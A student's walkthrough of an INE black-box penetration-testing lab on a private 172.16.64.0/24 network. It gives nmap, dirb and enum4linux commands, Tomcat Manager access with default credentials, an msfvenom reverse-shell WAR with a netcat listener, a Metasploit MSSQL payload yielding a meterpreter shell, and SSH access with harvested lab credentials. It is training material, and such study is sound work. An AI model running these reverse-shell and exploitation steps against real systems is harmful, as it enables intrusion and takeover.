# Rachel Murphy
# INE-8/20/21
# Black Box Pen Test 1

# Scenario
- You have been engaged in a Black-box Penetration Test (172.16.64.0/24 range). Your goal is to read the flag file on each machine. On some of them, you will be required to exploit a remote code execution vulnerability in order to read the flag.
- Some machines are exploitable instantly but some might require exploiting other ones first. Enumerate every compromised machine to identify valuable information, that will help you proceed further into the environment.
- If you are stuck on one of the machines, don't overthink and start pentesting another one.
- When you read the flag file, you can be sure that the machine was successfully compromised. But keep your eyes open - apart from the flag, other useful information may be present on the system.

# Goals
- Discover and exploit all the machines on the network
- Read all flag files (one per machine)

# What you will learn
- How to exploit Apache Tomcat
- How to exploit SQL server
- Post Exploitation Discovery
- Arbitrary file upload exploitation

# Recommended Tools
- Dirb
- Metasploit framework
- Nmap 
- Netcat

---

1. Find alive hosts on the network.

`nmap -sn 172.16.64.0/24`

```
Nmap scan report for 172.16.64.101
Host is up (0.12s latency).
MAC Address: 00:50:56:A2:52:F0 (VMware)
Nmap scan report for 172.16.64.140
Host is up (0.11s latency).
MAC Address: 00:50:56:A2:E4:85 (VMware)
Nmap scan report for 172.16.64.182
Host is up (0.059s latency).
MAC Address: 00:50:56:A2:B1:61 (VMware)
Nmap scan report for 172.16.64.199
Host is up (0.057s latency).
MAC Address: 00:50:56:A2:BF:51 (VMware)
Nmap scan report for 172.16.64.10
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 5.24 seconds
```
Five hosts are up.

Performing service detection scan against all targets.

`sudo nmap -sV -sS -v 172.16.64.10,101,140,182,199 -oN servicescan.txt`

Nmap results for `172.16.64.101` -pwn. 

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
9080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 00:50:56:A2:52:F0 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Nmap results for `172.16.64.140` -

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
MAC Address: 00:50:56:A2:E4:85 (VMware)
```
Nmap results for `172.16.64.182`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
MAC Address: 00:50:56:A2:B1:61 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Nmap results for `172.16.64.199`

```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2014 12.00.2000
MAC Address: 00:50:56:A2:BF:51 (VMware)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
- Beginning with `172.16.64.101` and visiting the webserver over port 8080.

Using DIRB with `dirb http://172.16.64.101:8080/ /usr/share/dirb/wordlists/vulns/apache.txt`

Apache Tomcat Manager Auth Page at http://172.16.64.101:9080

Logged into webapp with username: tomcat password: s3cret

Uploaded .war file exploit with msfvenom (USE LHOST VPN IP!!)
`msfvenom -p java/shell_reverse_tcp lhost=172.16.64.10 lport=1996 -f war -o 2pwn.war`
Set up netcat listener and then deploy the 2pwn .war file
`nc -lvnp 1996` 
Remote connection made and locate the flag.txt files with `locate flag.txt`

- Next target http://172.16.64.140:80
- Apache httpd 2.4.18
Enumerating directories with dirb.
`dirb http://172.16.64.140:80 /usr/share/wordlists/dirb/common.txt`
Navigated to the /project directory
Entered credentials: admin:admin
and.....accessed web browser.

![project](https://user-images.githubusercontent.com/76081641/130362887-cbf7e30f-e553-4e92-8348-a3ebfa057e4c.png)

Enumerate harder.

dirb http://172.16.64.140/project -u admin:admin 

INTERESTING DIRECTORY

http://172.16.64.140/project/backup/test/sdadas.txt

Driver={SQL Server};Server=foosql.foo.com;Database=;Uid=fooadmin;Pwd=fooadmin;
/var/www/html/project/354253425234234/flag.txt

![mysqlcreds](https://user-images.githubusercontent.com/76081641/130326946-f9519d7e-60da-4d55-a8a1-499906bcd998.png)


Perform a simple directory traversal to read the flag.txt file. 

http://172.16.64.140/project/354253425234234/flag.txt

![flag](https://user-images.githubusercontent.com/76081641/130362852-522c7135-a21b-4a26-947c-94ebb2d228f5.png)


- Next target `172.16.64.182` - This ended up being the last machine because the ssh user credentials were stored in the windows machine. 

Recalling the nmap scan 

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
MAC Address: 00:50:56:A2:B1:61 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Next target `172.16.64.199`

Recalling the nmap scan 

```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2014 12.00.2000
MAC Address: 00:50:56:A2:BF:51 (VMware)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
Most likely a null session or mssql vulnerability.

Enumerating with nmap for null sessions.

`enum4linux -a 172.16.64.199`

![image](https://user-images.githubusercontent.com/76081641/130455544-9abda385-cc7b-479e-ac11-8acb82f9a031.png)

Using metasploit to automate reconnaissance of the MS SQL Server.
Using database credentials found fooadmin:fooadmin to log in. 

![image](https://user-images.githubusercontent.com/76081641/130457410-2aca903a-22f2-40e9-8bd5-dd146b444595.png)

System Administrator Logins and Windows Logins for the Server

![image](https://user-images.githubusercontent.com/76081641/130458271-3d4f3c36-3ec9-4196-8432-081a0fe47a45.png)

Fooadmin has administratice privileges. 

Using an additional module in metasploit to gain a reverse shell on the mssql server.

`use exploit/windows/mssql/mssql_payload`

Configuring the module with the `windows/x64/meterpreter_reverse_tcp`

![image](https://user-images.githubusercontent.com/76081641/130459672-fdabab49-a6d2-4912-933c-da8805ed49b8.png)

IT WORKED!!! Gained a meterpreter shell.

Spawn remote shell with `shell cd c:\Users dir`

![image](https://user-images.githubusercontent.com/76081641/130460441-bf64c4f3-8078-4298-9029-de966695f4e1.png)

Exploring remote machine and locate flag in `C:\Users\AdminELS\Desktop`

![image](https://user-images.githubusercontent.com/76081641/130461225-7a0074f0-2857-4957-b4f1-123892be32d7.png)

Searching for SSH log in credentials for the Linux machine. Located id_rsa.pub within on the AdminELS Desktop.

![image](https://user-images.githubusercontent.com/76081641/130466625-01fb6bcf-0d0d-4736-8073-4c40af0d89a5.png)

`ssh://developer:dF3334slKw@172.16.64.182:22#############################################################################################################################################################################################`

Weird. Where is the private key..

`ssh dF3334slKw@172.16.64.182 `

Should be `ssh developer@172.16.64.182`

Password: dF3334slKw

![image](https://user-images.githubusercontent.com/76081641/130468162-8bae8f29-0e72-4353-b3a2-9387d4155aca.png)

LAST FLAG!!!

![image](https://user-images.githubusercontent.com/76081641/130468356-b2116ec9-7479-4d55-9645-5ce2c663b6ea.png)
